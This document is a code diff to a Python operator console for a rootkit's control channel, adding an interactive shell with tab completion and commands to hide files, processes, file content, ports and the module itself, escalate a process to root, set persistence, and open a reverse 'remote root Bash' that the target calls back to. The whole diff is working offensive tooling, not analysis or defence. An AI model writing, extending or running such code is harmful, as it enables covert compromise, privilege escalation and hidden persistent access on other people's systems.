@@ -2,11 +2,13 @@
 
 from __future__ import annotations
 
+import cmd
 from dataclasses import dataclass
 import fcntl
 import os
 from pathlib import Path
 import re
+import readline  # noqa: F401
 import secrets
 import selectors
 import socket
@@ -38,7 +40,8 @@ SHELL_STATUS = re.compile(
     r"(idle|connecting|running|exited|refused|timed-out|failed|stopped) "
     r"(-?[0-9]+)"
 )
-COMMAND_HELP = """Hide
+COMMAND_HELP = """\
+Hide
   hide file PREFIX      hide files with this prefix from directory listings
   hide pid PID          hide this PID from /proc
   hide content STRING   hide lines containing this string from file reads
@@ -53,7 +56,11 @@ Operate
   escalate PID          escalate process to root
   shell                 open interactive root Bash
   shell status          show the latest shell result
-  status                show current state and hidden targets
+
+View
+  status                module state and target counts
+  list                  show all hidden targets with indices
+  list CATEGORY         show targets for file, pid, content, or port
 
 Session
   ping                  test the control channel
@@ -61,6 +68,177 @@ Session
   help                  show these commands
   quit                  disconnect
 """
+
+_CATEGORIES = ("file", "pid", "content", "port")
+
+
+class OperatorConsole(cmd.Cmd):
+    prompt = "operator> "
+    intro = None
+
+    def __init__(
+        self,
+        exchange: Callable[[str], str],
+        output: Callable[[str], None],
+        warning: Callable[[str], None],
+        success: Callable[[str], None],
+        on_shell: Callable[[str], None],
+    ):
+        super().__init__()
+        self._exchange = exchange
+        self._output = output
+        self._warning = warning
+        self._success = success
+        self._on_shell = on_shell
+        self._quit = False
+
+    def _send(self, wire: str) -> str:
+        try:
+            payload = wire.encode("ascii")
+        except UnicodeEncodeError:
+            self._warning("commands use ASCII characters only\n")
+            return ""
+        if len(payload) > CONTROL_TEXT_MAX:
+            self._warning(
+                f"command is too long (maximum {CONTROL_TEXT_MAX} bytes)\n"
+            )
+            return ""
+        return self._exchange(wire)
+
+    def _list_category(self, category: str) -> None:
+        count_reply = self._exchange(f"LIST {category}")
+        if not count_reply.startswith("LIST "):
+            return
+        count = int(count_reply.split()[1])
+        if count == 0:
+            self._output(f"  {category.lower()}: (empty)\n")
+            return
+        for i in range(count):
+            entry_reply = self._exchange(f"LIST {category} {i}")
+            if entry_reply.startswith("ENTRY "):
+                parts = entry_reply.split(None, 2)
+                value = parts[2] if len(parts) > 2 else ""
+                self._output(f"  [{i}] {value}\n")
+
+    def do_hide(self, arg: str) -> None:
+        parts = arg.strip().split(None, 1)
+        if not parts:
+            self._warning("usage: hide file|pid|content|port|module VALUE\n")
+            return
+        sub = parts[0].lower()
+        if sub == "module":
+            self._send("HIDE MODULE")
+            return
+        if sub in _CATEGORIES and len(parts) == 2:
+            self._send(f"HIDE {sub.upper()} {parts[1]}")
+            return
+        self._warning("usage: hide file|pid|content|port VALUE\n")
+
+    def complete_hide(self, text: str, line: str, begidx: int, endidx: int):
+        words = line[:begidx].split()
+        if len(words) == 1:
+            return [c for c in (*_CATEGORIES, "module") if c.startswith(text)]
+        return []
+
+    def do_unhide(self, arg: str) -> None:
+        parts = arg.strip().split()
+        if not parts:
+            self._warning("usage: unhide file|pid|content|port N | unhide all | unhide module\n")
+            return
+        sub = parts[0].lower()
+        if sub == "all":
+            self._send("UNHIDE ALL")
+            return
+        if sub == "module":
+            self._send("UNHIDE MODULE")
+            return
+        if sub in _CATEGORIES and len(parts) == 2 and parts[1].isdigit():
+            self._send(f"UNHIDE {sub.upper()} {parts[1]}")
+            return
+        self._warning("usage: unhide file|pid|content|port N\n")
+
+    def complete_unhide(self, text: str, line: str, begidx: int, endidx: int):
+        words = line[:begidx].split()
+        if len(words) == 1:
+            return [c for c in (*_CATEGORIES, "all", "module") if c.startswith(text)]
+        return []
+
+    def do_list(self, arg: str) -> None:
+        cat = arg.strip().lower()
+        if not cat:
+            for c in _CATEGORIES:
+                self._output(f"{c}:\n")
+                self._list_category(c.upper())
+            return
+        if cat in _CATEGORIES:
+            self._output(f"{cat}:\n")
+            self._list_category(cat.upper())
+            return
+        self._warning("usage: list [file|pid|content|port]\n")
+
+    def complete_list(self, text: str, line: str, begidx: int, endidx: int):
+        return [c for c in _CATEGORIES if c.startswith(text)]
+
+    def do_status(self, arg: str) -> None:
+        reply = self._exchange("STATUS")
+        if not reply.startswith("STATUS "):
+            return
+        fields = {}
+        for pair in reply[7:].split():
+            if "=" in pair:
+                k, v = pair.split("=", 1)
+                fields[k] = v
+        self._output(f"  module hidden:   {fields.get('hidden', '?')}\n")
+        self._output(f"  file targets:    {fields.get('files', '?')}\n")
+        self._output(f"  pid targets:     {fields.get('pids', '?')}\n")
+        self._output(f"  content targets: {fields.get('content', '?')}\n")
+        self._output(f"  port targets:    {fields.get('ports', '?')}\n")
+
+    def do_escalate(self, arg: str) -> None:
+        pid = arg.strip()
+        if not pid or not pid.isdigit():
+            self._warning("usage: escalate PID\n")
+            return
+        self._send(f"ESCALATE {pid}")
+
+    def do_persist(self, arg: str) -> None:
+        self._send("PERSIST")
+
+    def do_shell(self, arg: str) -> None:
+        sub = arg.strip().lower()
+        if sub == "status":
+            self._send("SHELL STATUS")
+            return
+        reply = self._send(f"SHELL {GUEST_SHELL_PORT}")
+        if reply and reply.startswith("OPEN "):
+            self._on_shell(reply)
+
+    def complete_shell(self, text: str, line: str, begidx: int, endidx: int):
+        return [c for c in ("status",) if c.startswith(text)]
+
+    def do_ping(self, arg: str) -> None:
+        self._send("PING")
+
+    def do_info(self, arg: str) -> None:
+        self._send("INFO")
+
+    def do_quit(self, arg: str) -> bool:
+        self._quit = True
+        return True
+
+    do_EOF = do_quit
+
+    def do_help(self, arg: str) -> None:
+        self._output(COMMAND_HELP)
+
+    def default(self, line: str) -> None:
+        self._warning(f"unknown command: {line}; type help\n")
+
+    def emptyline(self) -> None:
+        pass
+
+    def postcmd(self, stop: bool, line: str) -> bool:
+        return stop
 CONTROL_TEXT_MAX = FRAME_MAX - HEADER_LENGTH - TAG_LENGTH
 SESSION_FILES = frozenset((
     "control.key", "operator.ready", "session.toml",
@@ -675,35 +853,40 @@ def _encode_control_command(command: str) -> bytes:
 
 
 def _parse_operator_command(line: str) -> str | None:
+    """Legacy parser kept for non-interactive callers."""
     parts = line.strip().split(None, 2)
     if not parts:
         return None
     verb = parts[0].lower()
-    if verb == "hide" and len(parts) == 3:
-        category = parts[1].lower()
-        value = parts[2]
-        if category in ("file", "pid", "content", "port"):
-            return f"HIDE {category.upper()} {value}"
+    if verb == "hide":
+        if len(parts) == 2 and parts[1].lower() == "module":
+            return "HIDE MODULE"
+        if len(parts) == 3:
+            category = parts[1].lower()
+            value = parts[2]
+            if category in _CATEGORIES:
+                return f"HIDE {category.upper()} {value}"
     elif verb == "unhide":
         if len(parts) == 2 and parts[1].lower() == "all":
             return "UNHIDE ALL"
+        if len(parts) == 2 and parts[1].lower() == "module":
+            return "UNHIDE MODULE"
         if len(parts) == 3:
             category = parts[1].lower()
             index = parts[2]
-            if category in ("file", "pid", "content", "port") and index.isdigit():
+            if category in _CATEGORIES and index.isdigit():
                 return f"UNHIDE {category.upper()} {index}"
-    elif verb == "list" and len(parts) == 2:
-        category = parts[1].lower()
-        if category in ("file", "pid", "content", "port"):
-            return f"LIST {category.upper()}"
+    elif verb == "list":
+        if len(parts) == 1:
+            return "LIST ALL"
+        if len(parts) == 2:
+            category = parts[1].lower()
+            if category in _CATEGORIES:
+                return f"LIST {category.upper()}"
     elif verb == "status":
         return "STATUS"
     elif verb == "persist":
         return "PERSIST"
-    elif verb == "hide" and len(parts) == 2 and parts[1].lower() == "module":
-        return "HIDE MODULE"
-    elif verb == "unhide" and len(parts) == 2 and parts[1].lower() == "module":
-        return "UNHIDE MODULE"
     elif verb == "escalate" and len(parts) == 2 and parts[1].isdigit():
         return f"ESCALATE {parts[1]}"
     elif verb == "shell":
@@ -717,34 +900,6 @@ def _parse_operator_command(line: str) -> str | None:
     elif verb == "quit":
         return "QUIT"
     return None
-
-
-def _next_control_command(
-    input_stream: TextIO,
-    output: Callable[[str], None],
-    warning: Callable[[str], None],
-) -> tuple[str, bytes] | None:
-    while True:
-        output("operator> ")
-        line = input_stream.readline()
-        if not line:
-            return None
-        command = line.strip()
-        if not command:
-            continue
-        if command.lower() in ("help", "?"):
-            output(COMMAND_HELP)
-            continue
-        wire = _parse_operator_command(command)
-        if wire is None:
-            warning(f"unknown command: {command}; type help")
-            continue
-        try:
-            payload = _encode_control_command(wire)
-        except OperatorError as error:
-            warning(str(error))
-            continue
-        return wire, payload
 
 
 def _poll_shell_status(
@@ -842,7 +997,7 @@ def run_control_console(
         )
         session = secure.accept_hello(receive_frame(peer))
         success(f"verify  HELLO    session={session:016x}")
-        output("Type help to list the fixed protocol commands.\n")
+        output("Type help to list commands. Tab completes.\n")
 
         def exchange(command: str) -> str:
             output(f"send    {command}\n")
@@ -855,44 +1010,39 @@ def run_control_console(
             output(f"recv    {reply}\n")
             return reply
 
-        while True:
-            selected = _next_control_command(
-                input_stream,
-                output,
+        def handle_shell(reply: str) -> None:
+            request_id, cookie = parse_shell_ticket(reply)
+            output("wait    shell    target callback\n")
+            shell = _accept_shell_while_running(
+                operator.shell_listener,
+                process,
+                request_id,
+                cookie,
+                30,
                 warning,
             )
-            if selected is None:
-                break
-            command_text, payload = selected
-            output(f"send    {command_text}\n")
-            send_frame(peer, secure.seal_request(payload))
-            if command_text == "QUIT":
-                break
-            reply = secure.open_reply(receive_frame(peer)).decode(
-                "ascii", errors="replace"
+            output(
+                "recv    RKSH "
+                f"{request_id:08x} {cookie:016x}\n"
             )
-            output(f"recv    {reply}\n")
-            if reply.startswith("OPEN "):
-                request_id, cookie = parse_shell_ticket(reply)
-                output("wait    shell    target callback\n")
-                shell = _accept_shell_while_running(
-                    operator.shell_listener,
-                    process,
-                    request_id,
-                    cookie,
-                    30,
-                    warning,
-                )
-                output(
-                    "recv    RKSH "
-                    f"{request_id:08x} {cookie:016x}\n"
-                )
-                success("verify  ticket   matched")
-                output("Remote root Bash. Type exit to return.\n")
-                with shell:
-                    _relay_shell(shell, input_stream, output)
-                output("\nRemote Bash closed.\n")
-                _poll_shell_status(request_id, exchange)
+            success("verify  ticket   matched")
+            output("Remote root Bash. Type exit to return.\n")
+            with shell:
+                _relay_shell(shell, input_stream, output)
+            output("\nRemote Bash closed.\n")
+            _poll_shell_status(request_id, exchange)
+
+        console = OperatorConsole(exchange, output, warning, success,
+                                  handle_shell)
+        if input_stream is not sys.stdin:
+            console.use_rawinput = False
+            console.stdin = input_stream
+        console.cmdloop()
+        if console._quit:
+            try:
+                send_frame(peer, secure.seal_request(b"QUIT"))
+            except Exception:
+                pass
         return 0
     except KeyboardInterrupt as error:
         raise OperatorError("control console interrupted") from error
